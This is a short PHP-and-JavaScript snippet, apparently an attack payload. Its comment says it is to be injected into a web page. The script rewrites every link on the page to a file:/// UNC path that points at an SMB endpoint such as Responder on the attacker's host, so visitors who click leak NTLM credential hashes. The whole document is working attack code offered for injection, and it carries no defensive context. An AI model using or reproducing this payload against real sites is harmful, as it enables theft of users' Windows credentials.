<?php
  /**
  * Inject this in order to have all "a" links on the page reassigned to point to the SMB endpoint (e.g. Responder) on the host this script is running on
  */
  $url = "file:///\\\\".$_SERVER["SERVER_ADDR"]."/page";
  echo "// $url\n";
?>
col = document.getElementsByTagName('a');
for( var i in col ){
  el = col[i];
  el.href = '<?php echo $url; ?>';
}
